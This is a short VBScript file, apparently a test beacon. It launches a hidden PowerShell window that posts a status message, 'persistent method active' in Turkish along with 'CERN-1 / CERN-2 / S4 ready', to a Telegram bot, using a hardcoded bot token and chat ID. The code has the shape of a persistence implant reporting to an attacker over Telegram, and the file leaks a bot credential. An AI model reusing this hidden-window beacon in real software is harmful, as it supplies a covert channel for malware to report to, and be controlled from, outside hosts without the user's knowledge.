Dim token, chatId, msg, psCmd
token = "8997947154:AAGYl3AxGLLYp0rrQOavt-wBlrRT0hzKoOo"
chatId = "1021566586"
msg = "BY HOOK | VBS TEST" & Chr(10) & "Kalici yontem aktif." & Chr(10) & "CERN-1 / CERN-2 / S4 hazir."

psCmd = "powershell -NoProfile -Command """ & _
    "$token='" & token & "'; " & _
    "$msg='" & msg & "'; " & _
    "$body = @{chat_id='" & chatId & "'; text=$msg} | ConvertTo-Json -Compress; " & _
    "$bytes = [System.Text.Encoding]::UTF8.GetBytes($body); " & _
    "Invoke-RestMethod -Uri ('https://api.telegram.org/bot' + $token + '/sendMessage') " & _
    "-Method Post -ContentType 'application/json; charset=utf-8' -Body $bytes" & _
    """"

CreateObject("WScript.Shell").Run psCmd, 0, True
MsgBox "Telegram mesaji gonderildi!", 64, "By Hook"
